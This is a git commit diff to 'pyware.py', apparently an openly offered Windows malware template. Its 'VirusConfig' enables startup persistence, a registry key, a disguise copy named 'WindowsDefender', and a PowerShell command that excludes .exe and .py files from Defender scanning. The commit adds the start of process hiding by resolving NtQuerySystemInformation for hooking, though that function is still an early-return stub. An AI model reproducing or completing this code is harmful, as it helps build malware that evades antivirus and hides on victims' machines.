67086cf5e10db92da405cd03c3a7ef2395838635
lilmond <54730301+lilmond@users.noreply.github.com>
2023-04-09 21:09:25 +0800

    Update pyware.py

--- pyware.py
+++ pyware.py
@@ -1,4 +1,6 @@
+import ctypes.wintypes
 import subprocess
+import threading
 import winreg
 import ctypes
 import sys
@@ -7,6 +9,7 @@ import os
 kernel32 = ctypes.WinDLL("kernel32")
 user32 = ctypes.WinDLL("user32")
 ntdll = ctypes.WinDLL("ntdll")
+psapi = ctypes.WinDLL("psapi")
 
 # Your virus functionalities here
 class Virus(object):
@@ -23,7 +26,16 @@ class VirusConfig:
     ADD_REG_KEY = True
     ADD_AV_EXCLUSION = True
     COPY_FILENAME = "WindowsDefender"
+    HIDE_PROCESS = True
 
+# -------------------- #
+
+class LPMODULEINFO(ctypes.Structure):
+    _fields_ = [
+        ("lpBaseOfDll", ctypes.c_void_p),
+        ("SizeOfImage", ctypes.wintypes.DWORD),
+        ("EntryPoint", ctypes.c_void_p)
+    ]
 
 def add_to_startup():
     username = os.environ["username"]
@@ -68,7 +80,29 @@ def add_av_exclusion():
     subprocess.Popen("powershell Add-MpPreference -ExclusionExtension exe, py", shell=True)
 
 def hide_process():
-    pass # secret :)
+    return
+    kernel32.GetCurrentProcessId.restype = ctypes.c_int
+    process_id = kernel32.GetCurrentProcessId()
+
+    kernel32.GetModuleHandleW.argtypes = [ctypes.wintypes.LPCWSTR]
+    kernel32.GetModuleHandleW.restype = ctypes.c_void_p
+    kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
+    kernel32.GetProcAddress.restype = ctypes.c_void_p
+    proc_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleW("ntdll"), b"NtQuerySystemInformation")
+
+    psapi.GetModuleInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.HMODULE, ctypes.POINTER(LPMODULEINFO), ctypes.wintypes.DWORD]
+    psapi.GetModuleInformation.restype = ctypes.wintypes.BOOL
+    kernel32.GetCurrentProcess.restype = ctypes.wintypes.HANDLE
+    kernel32.GetModuleHandleW.argtypes = [ctypes.c_int]
+    mod_handle = kernel32.GetModuleHandleW(0)
+    mod_info = LPMODULEINFO(0)
+    text = psapi.GetModuleInformation(kernel32.GetCurrentProcess(), mod_handle, mod_info, LPMODULEINFO.__sizeof__(LPMODULEINFO))
+
+def hook_dll():
+    pass
+
+def hide_process_thread():
+    pass
 
 def main():
     if VirusConfig.ADD_TO_STARTUP:
@@ -79,6 +113,8 @@ def main():
         hide_file(os.getcwd() + "\\" + sys.argv[0])
     if VirusConfig.ADD_AV_EXCLUSION:
         add_av_exclusion()
+    if VirusConfig.HIDE_PROCESS:
+        hide_process()
 
     Virus()
 
